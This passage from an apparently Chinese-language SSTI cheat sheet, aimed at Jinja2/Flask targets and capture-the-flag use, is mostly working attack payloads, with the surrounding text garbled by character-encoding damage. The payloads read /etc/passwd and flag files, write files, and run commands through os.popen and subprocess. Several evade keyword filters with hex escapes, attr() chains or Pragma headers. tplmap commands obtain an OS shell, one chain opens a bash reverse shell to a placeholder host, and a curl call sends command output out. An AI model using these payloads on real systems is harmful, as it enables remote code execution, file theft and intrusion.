class="hljs-variable">object</span>&#x27;<span class="hljs-operator">&gt;</span>)</span><br>- __subclasses__(): è¿”å›ç±»çš„æ‰€æœ‰å­ç±»ï¼Œé€šå¸¸é…åˆ__class__ï¼Œ__base__æ¥è·å–æ‰§è¡Œå‘½ä»¤æˆ–æ–‡ä»¶æ“ä½œçš„ç±»ã€‚ ä¾‹ï¼š().__class__.__base__.__subclasses__()<br>- __init__: è¿”å›åˆå§‹åŒ–å¯¹è±¡ã€‚<br>- __globals__: ä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰ç©ºé—´ä¸‹çš„æ‰€æœ‰å¯ä½¿ç”¨æ¨¡å—ã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚<br>- __builtins__: è¿”å›å½“å‰æ‰€æœ‰å¯¼å…¥çš„å†…ç½®å‡½æ•°ã€‚<br></code></pre></td></tr></table></figure><h2 id="æ‰¾åˆ°é“¾å†è¿›è¡Œè¿‡æ»¤ç»•è¿‡"><a href="#æ‰¾åˆ°é“¾å†è¿›è¡Œè¿‡æ»¤ç»•è¿‡" class="headerlink" title="æ‰¾åˆ°é“¾å†è¿›è¡Œè¿‡æ»¤ç»•è¿‡"></a><code>æ‰¾åˆ°é“¾å†è¿›è¡Œè¿‡æ»¤ç»•è¿‡</code></h2><h3 id="æ‰¾åˆ°objectå¯¹è±¡"><a href="#æ‰¾åˆ°objectå¯¹è±¡" class="headerlink" title="æ‰¾åˆ°objectå¯¹è±¡"></a><code>æ‰¾åˆ°objectå¯¹è±¡</code></h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> &#x27;&#x27;.<span class="hljs-strong">__class__</span>.mro<span class="hljs-strong">__[1]</span><br><span class="hljs-strong">- &#123;&#125;.__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br><span class="hljs-strong">- ().__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br><span class="hljs-strong">- [].__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br></code></pre></td></tr></table></figure><h3 id="è·å–æ‰€æœ‰æœ‰ç”¨çš„class"><a href="#è·å–æ‰€æœ‰æœ‰ç”¨çš„class" class="headerlink" title="è·å–æ‰€æœ‰æœ‰ç”¨çš„class"></a><code>è·å–æ‰€æœ‰æœ‰ç”¨çš„class</code></h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">- <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()<br>- &#123;&#125;.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- ().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- &#123;&#123; [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>() &#125;&#125;<br>- &#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">___mro__</span>()[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;<br>- &#123;&#123; <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a><code>æ–‡ä»¶è¯»å–</code></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.items</span>()[4][1].__class__.__mro__[2].__subclasses__()[40](<span class="hljs-name">&quot;/tmp/flag&quot;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">get_flashed_messages.__globals__.__builtins__.open</span>(<span class="hljs-name">&quot;/etc/passwd&quot;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"> Python3: åœ¨è¯¥ç‰ˆæœ¬ä¸­fileç±»è¢«åˆ é™¤äº†ï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨_frozen_importlib_external.FileLoaderæ¥è¯»å–æ–‡ä»¶ï¼š</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__mro__[1].__subclasses__()[94].get_data(0,&quot;test.txt&quot;)</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__mro__</span>[1].__subclasses__()[79][&quot;get_data&quot;](<span class="hljs-name">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- `&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç¯å¢ƒå˜åŒ–æœ‰ç‚¹å¤§ï¼Œå¹¶ä¸”Windowsä¸Linuxä¸‹ä¹Ÿæœ‰å·®å¼‚ï¼Œå¯ç¼–å†™è„šæœ¬éå†ï¼š</span><br><span class="language-xml"></span><br><span class="language-xml">- è„šæœ¬éå† object ç±»çš„æ‰€æœ‰å­ç±»ï¼ŒæŸ¥æ‰¾åŒ…å« &#x27;FileLoader&#x27; çš„ç±»åï¼Œç„¶åä½¿ç”¨å…¶ get_data æ–¹æ³•è¯»å– test.txt æ–‡ä»¶çš„å†…å®¹å¹¶è§£ç ï¼š</span><br><span class="language-xml">- &#123;% for x in [].__class__.__mro__[1].__subclasses__() %&#125;&#123;% if &#x27;FileLoader&#x27; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">x</span>().get_data(<span class="hljs-name">x</span>(), <span class="hljs-string">&#x27;test.txt&#x27;</span>).decode() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">### æ–‡ä»¶å†™å…¥</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__base__.__base__.__subclasses__()[40](&#x27;/tmp/1&#x27;,&#x27;w&#x27;).write(&#x27;hello&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="åŠ¨æ€æ‰§è¡Œï¼Œä¾‹å¦‚-input-ls"><a href="#åŠ¨æ€æ‰§è¡Œï¼Œä¾‹å¦‚-input-ls" class="headerlink" title="åŠ¨æ€æ‰§è¡Œï¼Œä¾‹å¦‚ ?input=ls"></a><code>åŠ¨æ€æ‰§è¡Œï¼Œä¾‹å¦‚ ?input=ls</code></h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;% for x in().__class__.__base__.__subelasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>().__module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾æƒ³è¦çš„æ¨¡å—"><a href="#æŸ¥æ‰¾æƒ³è¦çš„æ¨¡å—" class="headerlink" title="æŸ¥æ‰¾æƒ³è¦çš„æ¨¡å—"></a><code>æŸ¥æ‰¾æƒ³è¦çš„æ¨¡å—</code></h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>.<span class="hljs-strong">__subelasses__</span>().index(æ¨¡å—å)<br><span class="hljs-bullet">-</span> æŸ¥æ‰¾æƒ³è¦çš„æ¨¡å—:<br><span class="hljs-bullet">  -</span> num=0<br><span class="hljs-bullet">  -</span> for item in &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>():<br><span class="hljs-bullet">    -</span> try:<br><span class="hljs-bullet">      -</span> if &#x27;popen&#x27; in item.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>:<br><span class="hljs-bullet">        -</span> print(num,item)<br><span class="hljs-bullet">      -</span> num+=1<br><span class="hljs-bullet">    -</span> except:<br><span class="hljs-bullet">      -</span> num+=1<br><span class="hljs-bullet">-</span> &#123;% set num = 0 %&#125;&#123;% for item in &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if &#x27;popen&#x27; in item.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span> %&#125;&#123;&#123; num &#125;&#125;: &#123;&#123; item &#125;&#125;&#123;% endif %&#125;&#123;% set num = num + 1 %&#125;&#123;% endfor %&#125;<br><br>è·å–å…¨å±€é…ç½®ï¼š&#123;&#123;config&#125;&#125;<br></code></pre></td></tr></table></figure><p><code>tplmapå·¥å…·ï¼š</code></p><ul><li><code>æµ‹è¯•æ˜¯å¦å­˜åœ¨sstiï¼špython2 tplmap.py â€“u &quot;xx&quot;</code></li><li><code>æ‰§è¡Œæ¨¡æ¿è·å–shellï¼špython2 tplmap.py  -u &quot;xx&quot; --engine=jinja2 --os-shell</code></li></ul><h2 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a><code>å¸¸ç”¨payload</code></h2><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2:"></a><code>Python2:</code></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">- è¯»æ–‡ä»¶: ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">r&#x27;/flag&#x27;</span> ).read()<br>- å‘½ä»¤æ‰§è¡Œ: ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">50</span>].__init__.__func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )<br></code></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3:"></a><code>Python3:</code></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;1s&#x27;)</span><br><span class="language-xml">- &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="language-xml">- [].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">lipsum.__globals__</span>[&quot;os&quot;].popen(<span class="hljs-name">&#x27;id&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&quot;cmd&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">- *url_for.__globals__.os.__dict__.popen(request.args.file).read()ï¼Œç„¶åä¼ å‚fileï¼Œå†…å®¹ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="language-xml">-* url_for.__globals__.os.environ, æ‹¿ç¯å¢ƒå˜é‡</span><br><span class="language-xml">- *config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)ï¼Œå‚æ•°aæ˜¯è¦å¯¼å…¥çš„æ¨¡å—ï¼ˆosï¼‰ï¼Œå‚æ•°bæ˜¯ç¯å¢ƒå˜é‡åï¼ˆæŠŠgetenvæ¢äº†å°±èƒ½æ‰§è¡Œåˆ«çš„äº†ï¼‰http://example.com/?a=os&amp;b=HOMEä»è¯·æ±‚å‚æ•° a ä¸­æŒ‡å®šçš„æ¨¡å—å¯¼å…¥è¯¥æ¨¡å—ï¼Œç„¶åä½¿ç”¨ request.args.b ä½œä¸ºå‚æ•°è°ƒç”¨ getenv å‡½æ•°ï¼Œè·å–ç¯å¢ƒå˜é‡çš„å€¼å¹¶å°†å…¶è¾“å‡º</span><br><span class="language-xml">- ().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ      148  warnings.catch_warnings    ?b=eval&amp;c=&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span><br><span class="language-xml">- ().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()     </span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5F\x5Fclass\x5F\x5F&quot;]</span>[&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- *</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&quot;&quot;.__class__.__base__</span> .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">request.args.get</span>(<span class="hljs-name">&quot;cmd&quot;</span>)).read()&#125;&#125;</span><span class="language-xml">   get?cmd=cat /flag</span><br><span class="language-xml"></span><br><span class="language-xml">- å¦‚æœä½ æƒ³æ‰§è¡Œ ls å‘½ä»¤ï¼Œå¯ä»¥å°† (0x65,0x78,0x70,0x72,0x74) æ›¿æ¢ä¸º (0x6c, 0x73)ï¼Œå³ï¼š</span><br><span class="language-xml"></span><br><span class="language-xml">â€‹          </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.mro</span>()[1].__subclasses__()[337](<span class="hljs-name">get_flashed_messages.__class__.__mro__</span>[1].__subclasses__()[3]((<span class="hljs-name">0x6c</span>, <span class="hljs-number">0</span>x73)).decode(),<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml">è¿™æ®µä»£ç å°†æ‰§è¡Œ ls å‘½ä»¤ï¼Œå¹¶è¿”å›å½“å‰ç›®å½•çš„å†…å®¹ã€‚</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(%<span class="hljs-name">27application</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fglobals\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27</span>\x5f\x5fbuil%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>tins\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27</span>\x5f\x5fimp%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>ort\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27os</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27po</span>%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>pen%<span class="hljs-number">27</span>)(%<span class="hljs-name">27cmd</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27read</span>%<span class="hljs-number">27</span>)()&#125;&#125;</span><span class="language-xml"> ä½¿ç”¨æ—¶æŠŠcmdæ¢æˆå‘½ä»¤å¦‚ls</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">22</span>%<span class="hljs-number">22</span>|attr(%<span class="hljs-name">27</span>\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5f\x62\x61\x73\x65\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%<span class="hljs-number">27</span>)()|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(<span class="hljs-name">411</span>)(%<span class="hljs-name">27cmd</span>%<span class="hljs-number">27</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1)|attr(%<span class="hljs-name">27communicate</span>%<span class="hljs-number">27</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self</span>|attr(<span class="hljs-name">&quot;\x5f\x5fdict\x5f\x5f&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- *å¯ä»¥ç”¨è‡ªå®šä¹‰headerä¼ å‘½ä»¤ï¼š</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">joiner.__init__.__globals__.os.popen</span>(<span class="hljs-name">request.headers.cmd</span>).read()&#125;&#125;</span><span class="language-xml">,ç„¶åheaderé‡Œæ·»åŠ cmd: cat flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">455</span>)(<span class="hljs-name">request.args.shell</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=(<span class="hljs-name">1</span>).__neg__()).communicate()&#125;&#125;</span><span class="language-xml">:     ç”¨getitemç»•[]è¿‡æ»¤ï¼Œ(1).__neg__()ç»•è´Ÿå·è¿‡æ»¤</span><br><span class="language-xml"></span><br><span class="language-xml">- è¿‡æ»¤æ–¹æ‹¬å·ã€ä¸‹åˆ’çº¿åŠå¼•å·ã€‚åˆ©ç”¨lipsumé€ƒé€¸ï¼Œ|attr()ä»£æ›¿æ–¹æ‹¬å·ï¼Œå¹¶å°†å¸¦æœ‰ä¸‹åˆ’çº¿çš„é¡¹æ”¾åœ¨è¯·æ±‚å¤´ï¼Œç”¨request.pragma.0è®¿é—®ï¼ˆæœ‰äº›headeré‡Œé¢æ²¡æ³•æ”¾ä¸‹åˆ’çº¿ï¼ŒPragmaå¯ä»¥ï¼Œæ‰€ä»¥ç”¨å¤šä¸ªPragmaä¼ é€’å¸¦æœ‰ä¸‹åˆ’çº¿çš„é¡¹ï¼Œæ•°å­—è¡¨ç¤ºç¬¬iä¸ªPragmaé‡Œçš„å†…å®¹ï¼‰</span><br><span class="language-xml"></span><br><span class="language-xml"> * </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.pragma.0</span>)|attr(<span class="hljs-name">request.pragma.1</span>)(<span class="hljs-name">request.pragma.2</span>)|attr(<span class="hljs-name">request.pragma.3</span>)(<span class="hljs-name">request.pragma.4</span>)|attr(<span class="hljs-name">request.pragma.5</span>)(<span class="hljs-name">request.pragma.6</span>)|attr(<span class="hljs-name">request.pragma.7</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">  headers å¯ä»¥æ˜¯ï¼š</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __globals__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __getitem__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __builtins__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __import__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: os</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: popen</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: cat flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: read</span><br><span class="language-xml">  ### æ–‡ä»¶å†™å…¥ï¼š</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__base__.__base__.__subclasses__()[40](&#x27;/tmp/1&#x27;,&#x27;w&#x27;).write(&#x27;hello&#x27;)</span><br><span class="language-xml"></span><br><span class="language-xml">åŠ¨æ€æ‰§è¡Œï¼š</span><br><span class="language-xml"></span><br><span class="language-xml">ä¾‹å¦‚ ?input=ls</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for x in().__class__.__base__.__subelasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>().__module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;%endfor%&#125;`</span><br></code></pre></td></tr></table></figure><h3 id="å…¶ä»–åˆ©ç”¨"><a href="#å…¶ä»–åˆ©ç”¨" class="headerlink" title="å…¶ä»–åˆ©ç”¨"></a><code>å…¶ä»–åˆ©ç”¨</code></h3><ul><li><code>é€šè¿‡ç¼–å†™ä¸€ä¸ªé‚ªæ¶çš„é…ç½®æ–‡ä»¶æ¥åˆ©ç”¨ SSTIï¼š</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="language-xml">*# evil config</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/evilconfig.cfg&#x27;, &#x27;w&#x27;).write(&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"># load the evil config</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; config.from_pyfile(&#x27;/tmp/evilconfig.cfg&#x27;) &#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml"># connect to evil host</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&quot;&#x27;,shell=True) &#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="å…³é”®å­—è¿‡æ»¤-åˆ©ç”¨request"><a href="#å…³é”®å­—è¿‡æ»¤-åˆ©ç”¨request" class="headerlink" title="å…³é”®å­—è¿‡æ»¤ - åˆ©ç”¨request"></a><code>å…³é”®å­—è¿‡æ»¤ - åˆ©ç”¨request</code></h3><p><code>åˆ©ç”¨request, argsç‰¹æ€§ï¼ˆcookieç­‰ï¼‰ï¼š</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- _class_</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().__pop(<span class="hljs-name">40</span>)(<span class="hljs-name">request.args.path</span>).read()&#125;&#125;</span><span class="language-xml">&amp;path=/etc/passwd</span><br><span class="language-xml">- http://localhost:5000/?exploit=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr((<span class="hljs-name">request.args.use</span>*<span class="hljs-number">2</span>,request.args.class,request.args.use*<span class="hljs-number">2</span>)|join)&#125;&#125;</span><span class="language-xml">&amp;class=class&amp;use-_</span><br><span class="language-xml">- http://localhost:5000/?exploit=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">request.args_getlist</span>(<span class="hljs-name">request.args.l</span>)|join)&#125;&#125;</span><span class="language-xml">&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</span><br></code></pre></td></tr></table></figure><h3 id="ç›²å‘½ä»¤æ‰§è¡Œ"><a href="#ç›²å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç›²å‘½ä»¤æ‰§è¡Œ"></a><code>ç›²å‘½ä»¤æ‰§è¡Œ</code></h3><p><code>åˆ©ç”¨curlå°†æ‰§è¡Œç»“æœå¸¦å‡ºæ¥ï¼š</code></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ï½›% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.<span class="hljs-keyword">popen</span>(<span class="hljs-string">&#x27;curl http://ip: port?i=whoami&#x27;</span>).read()==<span 